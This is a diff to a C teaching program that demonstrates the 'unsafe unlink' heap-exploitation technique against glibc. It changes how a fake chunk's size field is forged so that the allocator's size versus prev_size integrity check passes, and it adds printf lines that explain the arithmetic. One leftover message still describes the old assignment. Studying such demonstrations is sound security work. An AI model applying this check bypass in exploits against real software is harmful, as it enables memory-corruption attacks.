@@ -34,7 +34,13 @@ int main()
 
 	printf("We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)\n");
 	printf("With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
-	chunk0_ptr[1] = chunk0_ptr[-3];
+	printf("P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))");
+	printf("If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).");
+	printf("We just need to set the *(chunk0_ptr + x) = x, so we can pass the check");
+	printf("1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing");
+	printf("2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass");
+	printf("3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20");
+	chunk0_ptr[1] = sizeof(size_t);
 	printf("Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n", chunk0_ptr[1]);
 	printf("You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");
 
